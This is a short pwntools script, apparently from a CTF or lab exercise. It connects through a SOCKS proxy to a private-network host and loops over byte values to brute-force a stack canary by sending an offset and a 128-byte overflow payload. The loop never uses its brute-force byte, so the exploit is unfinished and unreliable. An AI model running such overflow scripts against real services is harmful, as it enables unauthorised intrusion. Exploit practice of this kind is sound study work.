

# context.proxy = (socks.SOCKS5, 'localhost', 8123) # SOCKS proxy
# host = '192.168.2.99' # Remote machine name
# port = '56402' # Remote port
# p = remote(host, port)

from pwn import *
from time import sleep

# context.log_level = 'error'
offset = 128
# canary = b'\x98'
canary = b''

def output(p):
    output = b''
    while True:
        try:
            output += p.recvline()
        except EOFError:
            break
    return output

for i in range(1, 5):
    for brute in range(256):
        context.proxy = (socks.SOCKS5, 'localhost', 8123) # SOCKS proxy
        host = '192.168.2.99' # Remote machine name
        port = '51928' # Remote port
        p = remote(host, port)
        p.sendline(str(offset).encode())
        print(str(offset).encode())
        payload = b'A' * 128
        p.send(payload)
        print(p.recvlines(4))



